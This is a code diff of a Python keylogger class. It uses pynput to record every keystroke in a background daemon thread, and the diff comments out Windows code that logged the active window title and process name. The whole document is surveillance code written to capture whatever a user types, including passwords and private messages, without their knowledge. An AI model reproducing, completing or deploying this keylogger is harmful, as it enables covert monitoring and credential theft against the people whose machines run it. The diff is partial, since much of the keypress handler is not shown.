@@ -1,32 +1,33 @@
 from pynput.keyboard import Key, Listener
 from threading import Thread
-import win32gui, time, psutil, win32process
+import time, psutil
+# import win32gui, win32process
 
 class Keylogger:
 	def __init__(self):
-		self.last_window_title = ''
+		# self.last_window_title = ''
 		self.log_text = ''
-		self.log_window_title = ''
+		# self.log_window_title = ''
 
-	def log_window(self,):
-		w=win32gui
-		title = w.GetWindowText(w.GetForegroundWindow())
-		self.last_window_title = title if self.last_window_title == '' else self.last_window_title
-		def active_window_process_name():
-			pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
-			return psutil.Process(pid[-1]).name()
-		while True:
-			w=win32gui
-			title = w.GetWindowText(w.GetForegroundWindow())
-			try:
-				process_name = active_window_process_name()
-			except:
-				pass
-			if self.last_window_title == title or title == '':
-				pass
-			elif self.last_window_title != title:
-				self.last_window_title = title
-				self.log_window_title = f'[{title}]-[{process_name}]'
+	# def log_window(self,):
+	# 	w=win32gui
+	# 	title = w.GetWindowText(w.GetForegroundWindow())
+	# 	self.last_window_title = title if self.last_window_title == '' else self.last_window_title
+	# 	def active_window_process_name():
+	# 		pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
+	# 		return psutil.Process(pid[-1]).name()
+	# 	while True:
+	# 		w=win32gui
+	# 		title = w.GetWindowText(w.GetForegroundWindow())
+	# 		try:
+	# 			process_name = active_window_process_name()
+	# 		except:
+	# 			pass
+	# 		if self.last_window_title == title or title == '':
+	# 			pass
+	# 		elif self.last_window_title != title:
+	# 			self.last_window_title = title
+	# 			self.log_window_title = f'[{title}]-[{process_name}]'
 				# print(self.log_window_title)
 
 	def on_press(self, key):
@@ -117,13 +118,13 @@ class Keylogger:
 
 
 	def start(self):
-		log_window_thread = Thread(target=self.log_window)
+		# log_window_thread = Thread(target=self.log_window)
 		def keylog():
 			with Listener(on_press=self.on_press) as listener:
 				listener.join()
 		keylog_thr = Thread(target=keylog, daemon=True)
 		keylog_thr.start()
-		log_window_thread.start()
+		# log_window_thread.start()
 
 # keyl = Keylogger()
 # keyl.start()
